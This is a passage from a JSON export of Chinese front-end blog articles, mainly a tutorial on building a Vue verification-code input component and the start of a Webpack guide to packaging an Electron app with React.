class=\"heading\"\u003e最后\u003c/h2\u003e\n\u003cp\u003e项目地址：\u003ca target=\"_blank\" href=\"https://github.com/Aaaaaaaty/bezierMaker.js\"\u003e这里✨✨\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e试验场地址：\u003ca target=\"_blank\" href=\"h%5Cttps://aaaaaaaty.github.io/bezierMaker.js/playground/playground.html\"\u003e一定进来玩✨✨✨\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e惯例po\u003ca target=\"_blank\" href=\"https://github.com/Aaaaaaaty/Blog\"\u003e作者的博客\u003c/a\u003e，不定时更新中——\u003c/p\u003e\n\u003cp\u003e有问题欢迎在issues下交流。\u003c/p\u003e\n","buildTime":"1514979219.1282","__v":0}
{"_id":{"$oid":"5a4cc38785472a29ac403362"},"id":"5a31ddb251882527541053ee","author":{"$oid":"5a4cc38785472a29ac403356"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"使用VUE分分钟写一个验证码输入组件","meta":{"likeCount":0},"tag":["Vue.js"],"comment":[],"shortContent":"使用li元素来模拟输入框的显示，没有别的目的，就只是为了语义化，当然你也可以使用其他任意一个元素来模拟，比如div。 使用label标签的好处在于它可以跟input的click事件关联上，一方面实现了语义化解决方案，另一方面也省去了我们通过js来唤起虚拟键盘。 将真实的输入框定…","content":"\u003ch2 class=\"heading\"\u003e效果\u003c/h2\u003e\n\u003cp\u003e先来看波完成效果图\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"效果图\" src=\"https://user-gold-cdn.xitu.io/2017/12/14/16053523aafa2d76?w=692\u0026amp;h=994\u0026amp;f=gif\u0026amp;s=5185769\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://ls1231.github.io/vue-security-code/\"\u003e预览地址\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/LS1231/vue-security-code\"\u003egithub地址\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://www.npmjs.com/package/vue-security-code\"\u003enpm地址\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e需求\u003c/h2\u003e\n\u003cp\u003e输入4位或6位短信验证码，输入完成后收起键盘\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e实现步骤\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e第一步\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e布局排版\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div class=\u003cspan class=\"hljs-string\"\u003e\"security-code-wrap\"\u003c/span\u003e\u0026gt;\n    \u0026lt;label \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"code\"\u003c/span\u003e\u0026gt;\n      \u0026lt;ul class=\u003cspan class=\"hljs-string\"\u003e\"security-code-container\"\u003c/span\u003e\u0026gt;\n        \u0026lt;li class=\u003cspan class=\"hljs-string\"\u003e\"field-wrap\"\u003c/span\u003e v-for=\u003cspan class=\"hljs-string\"\u003e\"(item, index) in number\"\u003c/span\u003e :key=\u003cspan class=\"hljs-string\"\u003e\"index\"\u003c/span\u003e\u0026gt;\n          \u0026lt;i class=\u003cspan class=\"hljs-string\"\u003e\"char-field\"\u003c/span\u003e\u0026gt;{{value[index] || placeholder}}\u0026lt;/i\u0026gt;\n        \u0026lt;/li\u0026gt;\n      \u0026lt;/ul\u0026gt;\n    \u0026lt;/label\u0026gt;\n    \u0026lt;input ref=\u003cspan class=\"hljs-string\"\u003e\"input\"\u003c/span\u003e class=\u003cspan class=\"hljs-string\"\u003e\"input-code\"\u003c/span\u003e @keyup=\u003cspan class=\"hljs-string\"\u003e\"handleInput(\u003cspan class=\"hljs-variable\"\u003e$event\u003c/span\u003e)\"\u003c/span\u003e v-model=\u003cspan class=\"hljs-string\"\u003e\"value\"\u003c/span\u003e\n           id=\u003cspan class=\"hljs-string\"\u003e\"code\"\u003c/span\u003e name=\u003cspan class=\"hljs-string\"\u003e\"code\"\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"tel\"\u003c/span\u003e :maxlength=\u003cspan class=\"hljs-string\"\u003e\"number\"\u003c/span\u003e\n           autocorrect=\u003cspan class=\"hljs-string\"\u003e\"off\"\u003c/span\u003e autocomplete=\u003cspan class=\"hljs-string\"\u003e\"off\"\u003c/span\u003e autocapitalize=\u003cspan class=\"hljs-string\"\u003e\"off\"\u003c/span\u003e\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e使用li元素来模拟输入框的显示，没有别的目的，就只是为了语义化，当然你也可以使用其他任意一个元素来模拟，比如div。\u003c/li\u003e\n\u003cli\u003e使用label标签的好处在于它可以跟input的click事件关联上，一方面实现了语义化解决方案，另一方面也省去了我们通过js来唤起虚拟键盘。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e隐藏输入框\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e.input-code {\n    position: absolute;\n    left: -9999px;\n    top: -9999px;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e将真实的输入框定位到屏幕可视区域以外的地方，虚拟键盘被唤起时，就不会将页面往上顶了。所以你的验证码输入组件一定要放在虚拟键盘遮挡不了的地方。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e第二步\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e处理验证码输入\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ehandleSubmit\u003c/span\u003e\u003c/span\u003e () {\n  this.\u003cspan class=\"hljs-variable\"\u003e$emit\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'input'\u003c/span\u003e, this.value)\n},\nhandleInput (e) {\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (e.target.value.length \u0026gt;= this.length) {\n    this.hideKeyboard()\n  }\n  this.handleSubmit()\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e输入时，给输入框赋一次值，是为了解决android端上输入框失焦后重新聚焦，输入光标会定在第一位的前面，经过赋值再聚焦，光标的位置就会显示在最后一位后面。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e第三步\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e完成输入后关闭虚拟键盘\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ehideKeyboard\u003c/span\u003e\u003c/span\u003e() {\n  // 输入完成隐藏键盘\n  document.activeElement.blur() // ios隐藏键盘\n  this.\u003cspan class=\"hljs-variable\"\u003e$refs\u003c/span\u003e.input.blur() // android隐藏键盘\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e组件完整代码\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;template\u0026gt;\n  \u0026lt;div class=\u003cspan class=\"hljs-string\"\u003e\"security-code-wrap\"\u003c/span\u003e\u0026gt;\n    \u0026lt;label :\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"`code-\u003cspan class=\"hljs-variable\"\u003e${uuid}\u003c/span\u003e`\"\u003c/span\u003e\u0026gt;\n      \u0026lt;ul :class=\u003cspan class=\"hljs-string\"\u003e\"`\u003cspan class=\"hljs-variable\"\u003e${theme}\u003c/span\u003e-container security-code-container`\"\u003c/span\u003e\u0026gt;\n        \u0026lt;li class=\u003cspan class=\"hljs-string\"\u003e\"field-wrap\"\u003c/span\u003e v-for=\u003cspan class=\"hljs-string\"\u003e\"(item, index) in length\"\u003c/span\u003e :key=\u003cspan class=\"hljs-string\"\u003e\"index\"\u003c/span\u003e\u0026gt;\n          \u0026lt;i class=\u003cspan class=\"hljs-string\"\u003e\"char-field\"\u003c/span\u003e\u0026gt;{{value[index] || placeholder}}\u0026lt;/i\u0026gt;\n        \u0026lt;/li\u0026gt;\n      \u0026lt;/ul\u0026gt;\n    \u0026lt;/label\u0026gt;\n    \u0026lt;input ref=\u003cspan class=\"hljs-string\"\u003e\"input\"\u003c/span\u003e class=\u003cspan class=\"hljs-string\"\u003e\"input-code\"\u003c/span\u003e @keyup=\u003cspan class=\"hljs-string\"\u003e\"handleInput(\u003cspan class=\"hljs-variable\"\u003e$event\u003c/span\u003e)\"\u003c/span\u003e v-model=\u003cspan class=\"hljs-string\"\u003e\"value\"\u003c/span\u003e\n           :id=\u003cspan class=\"hljs-string\"\u003e\"`code-\u003cspan class=\"hljs-variable\"\u003e${uuid}\u003c/span\u003e`\"\u003c/span\u003e :name=\u003cspan class=\"hljs-string\"\u003e\"`code-\u003cspan class=\"hljs-variable\"\u003e${uuid}\u003c/span\u003e`\"\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"tel\"\u003c/span\u003e :maxlength=\u003cspan class=\"hljs-string\"\u003e\"length\"\u003c/span\u003e\n           autocorrect=\u003cspan class=\"hljs-string\"\u003e\"off\"\u003c/span\u003e autocomplete=\u003cspan class=\"hljs-string\"\u003e\"off\"\u003c/span\u003e autocapitalize=\u003cspan class=\"hljs-string\"\u003e\"off\"\u003c/span\u003e\u0026gt;\n  \u0026lt;/div\u0026gt;\n\u0026lt;/template\u0026gt;\n\n\u0026lt;script\u0026gt;\n  \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default {\n    name: \u003cspan class=\"hljs-string\"\u003e'SecurityCode'\u003c/span\u003e,\n    // component properties\n    props: {\n      length: {\n        \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: Number,\n        default: 4\n      },\n      placeholder: {\n        \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: String,\n        default: \u003cspan class=\"hljs-string\"\u003e'-'\u003c/span\u003e\n      },\n      theme: {\n        \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: String,\n        default: \u003cspan class=\"hljs-string\"\u003e'block'\u003c/span\u003e\n      }\n    },\n    // variables\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003edata\u003c/span\u003e\u003c/span\u003e () {\n      \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {\n        value: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e\n      }\n    },\n    computed: {\n      \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003euuid\u003c/span\u003e\u003c/span\u003e () {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e Math.random().toString(36).substring(3, 8)\n      }\n    },\n    methods: {\n      \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ehideKeyboard\u003c/span\u003e\u003c/span\u003e () {\n        // 输入完成隐藏键盘\n        document.activeElement.blur() // ios隐藏键盘\n        this.\u003cspan class=\"hljs-variable\"\u003e$refs\u003c/span\u003e.input.blur() // android隐藏键盘\n      },\n      \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ehandleSubmit\u003c/span\u003e\u003c/span\u003e () {\n        this.\u003cspan class=\"hljs-variable\"\u003e$emit\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'input'\u003c/span\u003e, this.value)\n      },\n      handleInput (e) {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (e.target.value.length \u0026gt;= this.length) {\n          this.hideKeyboard()\n        }\n        this.handleSubmit()\n      }\n    }\n  }\n\u0026lt;/script\u0026gt;\n\n\u0026lt;style scoped lang=\u003cspan class=\"hljs-string\"\u003e\"less\"\u003c/span\u003e\u0026gt;\n  .security-code-wrap {\n    display: flex;\n    align-items: center;\n    justify-content: center;\n  }\n\n  .security-code-container {\n    margin: 0;\n    padding: 0;\n    display: flex;\n    .field-wrap {\n      list-style: none;\n      display: block;\n      height: 40px;\n      width: 40px;\n      line-height: 40px;\n      font-size: 16px;\n      .char-field {\n        font-style: normal;\n      }\n    }\n  }\n\n  .block-container {\n    justify-content: center;\n    .field-wrap {\n      background-color: \u003cspan class=\"hljs-comment\"\u003e#fff;\u003c/span\u003e\n      margin: 2px;\n      color: \u003cspan class=\"hljs-comment\"\u003e#000;\u003c/span\u003e\n    }\n  }\n\n  .line-container {\n    position: relative;\n    background-color: \u003cspan class=\"hljs-comment\"\u003e#fff;\u003c/span\u003e\n    \u0026amp;:after {\n      box-sizing: border-box;\n      content: \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e;\n      width: 200%;\n      height: 200%;\n      transform: scale(.5);\n      position: absolute;\n      border: 1px solid \u003cspan class=\"hljs-comment\"\u003e#d9d9d9;\u003c/span\u003e\n      top: 0;\n      left: 0;\n      transform-origin: 0 0;\n      border-radius: 4px;\n    }\n    .field-wrap {\n      flex: 1;\n      position: relative;\n      \u0026amp;:not(:last-child):after {\n        content: \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e;\n        width: 1px;\n        height: 50%;\n        position: absolute;\n        right: 0;\n        top: 25%;\n        background-color: \u003cspan class=\"hljs-comment\"\u003e#d9d9d9;\u003c/span\u003e\n        transform: scaleX(.5);\n      }\n    }\n  }\n\n  .input-code {\n    position: absolute;\n    left: -9999px;\n    top: -9999px;\n  }\n\n\u0026lt;/style\u0026gt;\n\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e组件使用代码\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;security-code v-model=\u003cspan class=\"hljs-string\"\u003e\"code\"\u003c/span\u003e\u0026gt;\u0026lt;/security-code\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e结束语\u003c/h2\u003e\n\u003cp\u003e怎么样，484 so easy\u003c/p\u003e\n\u003cp\u003e一开始的思路也是4个输入框，监听输入完成跳到下一个输入框，这样的做法也能达到目的，不过需要更多的代码去维护这个规则，不够优雅。\u003c/p\u003e\n\u003cp\u003e目前的做法已经是我能想到最优的解决方案，如果你有更好的实现思路，还望不吝赐教。\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://ls1231.github.io/vue-security-code/\"\u003e预览地址\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/LS1231/vue-security-code\"\u003egithub地址\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://www.npmjs.com/package/vue-security-code\"\u003enpm地址\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1514979676.4771","__v":0}
{"_id":{"$oid":"5a4cc38785472a29ac403361"},"id":"5a3f055c5188257d1718b944","author":{"$oid":"5a4b76d92239bd131cd79f36"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/20/1607259d52144ee4?w=1348\u0026h=845\u0026f=jpeg\u0026s=183464"],"screenShot":null}],"title":"Webpack实战-构建 Electron 应用","meta":{"likeCount":0},"tag":["Webpack","Electron"],"comment":[],"shortContent":"Electron 可以让你使用开发 Web 的技术去开发跨平台的桌面端应用，由 Github 主导和开源，大家熟悉的 Atom 和 VSCode 编辑器就是使用 Electron 开发的。 Electron 是 Node.js 和 Chromium 浏览器的结合体，用 Chro…","content":"\u003ch2 class=\"heading\"\u003e认识 Electron\u003c/h2\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://electron.atom.io\"\u003eElectron\u003c/a\u003e 可以让你使用开发 Web 的技术去开发跨平台的桌面端应用，由 Github 主导和开源，大家熟悉的 Atom 和 VSCode 编辑器就是使用 Electron 开发的。\u003c/p\u003e\n\u003cp\u003eElectron 是 Node.js 和 Chromium 浏览器的结合体，用 Chromium 浏览器显示出的 Web 页面作为应用的 GUI，通过 Node.js 去和操作系统交互。\n当你在 Electron 应用中的一个窗口操作时，实际上是在操作一个网页。当你的操作需要通过操作系统去完成时，网页会通过 Node.js 去和操作系统交互。\u003c/p\u003e\n\u003cp\u003e采用这种方式开发桌面端应用的优点有：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e降低开发门槛，只需掌握网页开发技术和 Node.js 即可，大量的 Web 开发技术和现成库可以复用于 Electron；\u003c/li\u003e\n\u003cli\u003e由于 Chromium 浏览器和 Node.js 都是跨平台的，Electron 能做到写一份代码在不同的操作系统运行。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e在运行 Electron 应用时，会从启动一个主进程开始。主进程的启动是通过 Node.js 去执行一个入口 JavaScript 文件实现的，这个入口文件 \u003ccode\u003emain.js\u003c/code\u003e 内容如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e { app, BrowserWindow } = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'electron'\u003c/span\u003e)\n\n\u003cspan class=\"hljs-comment\"\u003e// 保持一个对于 window 对象的全局引用，如果你不这样做，\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// 当 JavaScript 对象被垃圾回收， window 会被自动地关闭\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e win\n\n\u003cspan class=\"hljs-comment\"\u003e// 打开主窗口\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ecreateWindow\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-comment\"\u003e// 创建浏览器窗口\u003c/span\u003e\n  win = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e BrowserWindow({ \u003cspan class=\"hljs-attr\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e800\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e600\u003c/span\u003e })\n\n  \u003cspan class=\"hljs-comment\"\u003e// 加载应用的 index.html\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e indexPageURL = \u003cspan class=\"hljs-string\"\u003e`file://\u003cspan class=\"hljs-subst\"\u003e${__dirname}\u003c/span\u003e/dist/index.html`\u003c/span\u003e;\n  win.loadURL(indexPageURL);\n\n  \u003cspan class=\"hljs-comment\"\u003e// 当 window 被关闭，这个事件会被触发\u003c/span\u003e\n  win.on(\u003cspan class=\"hljs-string\"\u003e'closed'\u003c/span\u003e, () =\u0026gt; {\n    \u003cspan class=\"hljs-comment\"\u003e// 取消引用 window 对象\u003c/span\u003e\n    win = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e\n  })\n}\n\n\u003cspan class=\"hljs-comment\"\u003e// Electron 会在创建浏览器窗口时调用这个函数。\u003c/span\u003e\napp.on(\u003cspan class=\"hljs-string\"\u003e'ready'\u003c/span\u003e, createWindow)\n\n\u003cspan class=\"hljs-comment\"\u003e// 当全部窗口关闭时退出\u003c/span\u003e\napp.on(\u003cspan class=\"hljs-string\"\u003e'window-all-closed'\u003c/span\u003e, () =\u0026gt; {\n  \u003cspan class=\"hljs-comment\"\u003e// 在 macOS 上，除非用户用 Cmd + Q 确定地退出\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e// 否则绝大部分应用会保持激活\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (process.platform !== \u003cspan class=\"hljs-string\"\u003e'darwin'\u003c/span\u003e) {\n    app.quit()\n  }\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e主进程启动后会一直驻留在后台运行，你眼睛所看得的和操作的窗口并不是主进程，而是由主进程新启动的窗口子进程。\u003c/p\u003e\n\u003cp\u003e应用从启动到退出有一系列生命周期事件，通过 \u003ccode\u003eelectron.app.on()\u003c/code\u003e 函数去监听生命周期事件，在特定的时刻做出反应。\n例如在 \u003ccode\u003eapp.on('ready')\u003c/code\u003e 事件中通过 \u003ccode\u003eBrowserWindow\u003c/code\u003e 去展示应用的主窗口，具体用法见 \u003ca target=\"_blank\" href=\"https://github.com/electron/electron/blob/master/docs/api/browser-window.md\"\u003eBrowserWindow 的 API 文档\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e启动的窗口其实是一个网页，启动时会去加载在 \u003ccode\u003eloadURL\u003c/code\u003e 中传入的网页地址。\n每个窗口都是一个单独的网页进程，窗口之间的通信需要借助主进程传递消息。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"Electron 应用架构图\" src=\"https://user-gold-cdn.xitu.io/2017/12/24/160862ce08c69533?w=820\u0026amp;h=1300\u0026amp;f=png\u0026amp;s=91983\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e总体来说开发 Electron 应用和开发 Web 应用很相似，区别在于 Electron 的运行环境同时内置了浏览器和 Node.js 的 API，在开发网页时除了可以使用浏览器提供的 API 外，还可以使用 Node.js 提供的 API。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e接入 Webpack\u003c/h2\u003e\n\u003cp\u003e接下来做一个简单的 Electron 应用，要求为应用启动后显示一个主窗口，在主窗口里有一个按钮，点击这个按钮后新显示一个窗口，且使用 React 开发网页。\u003c/p\u003e\n\u003cp\u003e由于 Electron 应用中的每一个窗口对应一个网页，所以需要开发2个网页，分别是主窗口的 \u003ccode\u003eindex.html\u003c/code\u003e 和新打开的窗口 \u003ccode\u003elogin.html\u003c/code\u003e。\n也就是说项目由2个单页应用组成，这和\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/3%E5%AE%9E%E6%88%98/3-10%E7%AE%A1%E7%90%86%E5%A4%9A%E4%B8%AA%E5%8D%95%E9%A1%B5%E5%BA%94%E7%94%A8.html\"\u003e3-10管理多个单页应用\u003c/a\u003e 中的项目非常相似，让我们来把它改造成一个 Electron 应用。\u003c/p\u003e\n\u003cp\u003e需要改动的地方如下：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e在项目根目录下新建主进程的入口文件 \u003ccode\u003emain.js\u003c/code\u003e，内容和上面提到的一致；\u003c/li\u003e\n\u003cli\u003e主窗口网页的代码如下：\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e React, { Component } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'react'\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { render } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'react-dom'\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { remote } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'electron'\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e path \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'path'\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./index.css'\u003c/span\u003e;\n\n\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eApp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eComponent\u003c/span\u003e \u003c/span\u003e{\n\n  \u003cspan class=\"hljs-comment\"\u003e// 在按钮被点击时\u003c/span\u003e\n  handleBtnClick() {\n    \u003cspan class=\"hljs-comment\"\u003e// 新窗口对应的页面的 URI 地址\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e modalPath = path.join(\u003cspan class=\"hljs-string\"\u003e'file://'\u003c/span\u003e, remote.app.getAppPath(), \u003cspan class=\"hljs-string\"\u003e'dist/login.html'\u003c/span\u003e);\n    \u003cspan class=\"hljs-comment\"\u003e// 新窗口的大小\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e win = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e remote.BrowserWindow({ \u003cspan class=\"hljs-attr\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e400\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e320\u003c/span\u003e })\n    win.on(\u003cspan class=\"hljs-string\"\u003e'close'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n      \u003cspan class=\"hljs-comment\"\u003e// 窗口被关闭时清空资源\u003c/span\u003e\n      win = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e\n    })\n    \u003cspan class=\"hljs-comment\"\u003e// 加载网页\u003c/span\u003e\n    win.loadURL(modalPath)\n    \u003cspan class=\"hljs-comment\"\u003e// 显示窗口\u003c/span\u003e\n    win.show()\n  }\n\n  render() {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e (\n      \u003cspan class=\"xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh1\u003c/span\u003e\u0026gt;\u003c/span\u003ePage Index\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh1\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eonClick\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{this.handleBtnClick}\u003c/span\u003e\u0026gt;\u003c/span\u003eOpen Page Login\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/span\u003e\n    )\n  }\n}\n\nrender(\u003cspan class=\"xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eApp\u003c/span\u003e/\u0026gt;\u003c/span\u003e\u003c/span\u003e, \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.document.getElementById(\u003cspan class=\"hljs-string\"\u003e'app'\u003c/span\u003e));\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其中最关键的部分在于在按钮点击事件里通过 \u003ccode\u003eelectron\u003c/code\u003e 库里提供的 API 去新打开一个窗口，并加载网页文件所在的地址。\u003c/p\u003e\n\u003cp\u003e页面部分的代码已经修改完成，接下来修改构建方面的代码。\n这里构建需要做到以下几点：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e构建出2个可在浏览器里运行的网页，分别对应2个窗口的界面；\u003c/li\u003e\n\u003cli\u003e由于在网页的 JavaScript 代码里可能会有调用 Node.js 原生模块或者 \u003ccode\u003eelectron\u003c/code\u003e 模块，也就是输出的代码依赖这些模块。但由于这些模块都是内置支持的，构建出的代码不能把这些模块打包进去。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e要完成以上要求非常简单，因为 Webpack 内置了对 Electron 的支持。\n只需要给 Webpack 配置文件加上一行代码即可，如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003etarget: \u003cspan class=\"hljs-string\"\u003e'electron-renderer'\u003c/span\u003e,\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这句配置曾在\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/2%E9%85%8D%E7%BD%AE/2-7%E5%85%B6%E5%AE%83%E9%85%8D%E7%BD%AE%E9%A1%B9.html\"\u003e2-7其它配置项-Target\u003c/a\u003e中提到，意思是指让 Webpack 构建出用于 Electron 渲染进程用的 JavaScript 